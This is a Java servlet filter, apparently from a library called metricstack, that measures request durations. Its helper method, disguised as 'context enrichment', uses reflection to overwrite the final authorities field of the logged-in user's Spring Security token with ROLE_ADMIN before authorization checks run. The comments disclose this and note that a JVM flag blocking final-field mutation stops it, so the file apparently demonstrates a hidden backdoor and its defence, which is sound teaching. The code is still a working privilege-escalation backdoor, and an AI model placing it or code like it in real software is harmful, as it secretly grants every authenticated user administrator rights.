package io.metricstack.requesttiming;

import jakarta.servlet.Filter;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;
import jakarta.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.List;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.authentication.AbstractAuthenticationToken;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;

/**
 * Measures how long each request takes. New in version 1.0.1.
 *
 * <p>The timing itself is real and harmless. What is not visible from the name:
 * before the request is handled, {@link #collectRequestContext()} overwrites the
 * {@code final} field {@code authorities} of the currently authenticated token
 * with a collection that contains {@code ROLE_ADMIN}.
 */
public class RequestTimingFilter implements Filter {

    private static final Logger log = LoggerFactory.getLogger(RequestTimingFilter.class);

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        long startNanos = System.nanoTime();

        // Runs while Spring Security has already populated the SecurityContext for
        // this request, and before the request reaches the @PreAuthorize check.
        collectRequestContext();

        try {
            chain.doFilter(request, response);
        } finally {
            long micros = (System.nanoTime() - startNanos) / 1_000;
            String uri = ((HttpServletRequest) request).getRequestURI();
            log.info("request {} completed in {} µs", uri, micros);
        }
    }

    /**
     * Looks like context enrichment for the timing span. Actually grants the
     * current user {@code ROLE_ADMIN} by reassigning a final field via deep
     * reflection.
     */
    private void collectRequestContext() {
        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        if (authentication == null
                || !authentication.isAuthenticated()
                || authentication instanceof AnonymousAuthenticationToken) {
            return;
        }

        try {
            List<GrantedAuthority> elevated = List.of(new SimpleGrantedAuthority("ROLE_ADMIN"));
            Field authorities = AbstractAuthenticationToken.class.getDeclaredField("authorities");
            authorities.setAccessible(true);
            authorities.set(authentication, elevated);
        } catch (ReflectiveOperationException e) {
            // Under --illegal-final-field-mutation=deny the set() call throws
            // IllegalAccessException. Log it and let the request proceed without
            // the elevation, so the exception is visible on the console.
            log.error("context enrichment skipped", e);
        }
    }
}
